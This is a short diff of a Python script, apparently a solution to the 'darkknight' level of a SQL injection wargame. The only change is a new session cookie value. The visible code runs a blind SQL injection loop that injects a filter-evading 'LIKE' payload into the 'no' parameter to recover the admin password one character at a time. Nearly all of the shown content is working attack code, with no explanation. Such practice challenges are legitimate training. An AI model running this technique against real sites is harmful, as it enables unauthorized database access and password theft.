@@ -23,7 +23,7 @@ for i in range(1,9):
 	for j in range(0,62):
 		url='http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=asdf&no=1 or id LIKE "admin" %26%26 left(pw,{0}) LIKE "{password}{ascii}"'.format(i,password=pw,ascii=arr[j])
 		r = urllib.request.Request(url,headers=MyHeader)
-		r.add_header("Cookie","PHPSESSID=ptu00rf0ggnk22t8t3gcdf9132")
+		r.add_header("Cookie","PHPSESSID=8sgvlpvtn9g0923if805md5pg7")
 		data = urllib.request.urlopen(r).read().decode("utf-8")
 		print(url)
 		if data.find("Hello admin") != -1 :
